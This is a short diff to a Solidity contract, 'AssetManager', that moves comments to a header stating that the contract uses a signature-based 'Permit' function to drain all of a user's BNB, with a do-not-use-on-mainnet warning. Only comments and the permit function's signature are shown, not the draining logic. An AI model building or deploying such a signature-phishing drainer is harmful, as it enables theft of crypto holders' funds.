@@ -1,3 +1,8 @@
+//This contract uses a signiature, or 'Permit' function to drain all gas tokens, in this case, BNB
+
+// However, The method used doesn't make as much sense for BNB because BNB does not require an "approval" process like ERC-20 tokens
+// This is a non-standard way to represent an off-chain approval for sending BNB and may confuse users or other developers.
+
 //*********--WARNING--********//
 //----------------------------//
 //***DO NOT USE ON MAIN-NET***//
@@ -34,8 +39,6 @@ contract AssetManager {
         );
     }
 
-    // This function doesn't make as much sense for BNB because BNB does not require an "approval" process like ERC-20 tokens
-    // This is a non-standard way to represent an off-chain approval for sending BNB and may confuse users or other developers.
     function permit(address owner, address spender, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
         require(block.timestamp <= deadline, "Permit: signature expired");
 
